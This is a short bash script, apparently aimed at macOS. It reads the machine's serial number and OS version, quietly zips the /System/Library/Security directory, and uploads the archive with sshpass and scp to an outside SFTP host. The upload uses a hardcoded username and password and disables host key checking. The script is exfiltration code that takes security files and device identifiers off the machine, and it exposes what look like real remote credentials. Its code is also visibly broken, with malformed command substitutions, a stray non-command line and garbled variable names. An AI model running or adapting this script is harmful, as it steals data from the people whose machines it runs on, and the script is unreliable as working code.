# Configuration
PERSON_NAME="shauki"
SERIAL_NUMBER=ioreg -c IOPlatformExpertDevice | grep IOPlatformSerialNumber | cut -d'"' -f4
IOS_VERSION=grep -A1 'ProductVersion' /System/Library/CoreServices/SystemVersion.plist | grep -oPm1 '(?<=<string>)[^<]+'
LOCAL_FILE="appstore_unmodified.zip"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_USER="af41b44a30114529875ee9754d12355c"
REMOTE_PASS="DdhgmJ8DiVDEy3qJTQgXh4Ez9AZ3pC8n"
REMOTE_PATH="/home"
REMOTE_DEST="/"
ARCHIVE_NAME="$IOS_VERSION_$SERIAL_NUMBER_$LOCAL_FILE_$PERSON_NAME"

cd $home/../../../System/Library/
archeiving files
echo "archiving silently"
zip -qr $ARCHIVE_NAME.zip Security && echo "Archiving complete!"






# --- Upload Command ---
# -p specifies the password
# -o StrictHostKeyChecking=no prevents the script from hanging on new host prompts
#sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$ARCHIVE_NAME" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
 echo "connection sucesfully"
# Check if the upload was successful
if [[ $? -eq 0 ]]; then
   echo "connection sucesfully"
else
   echo "connection failed."
fi
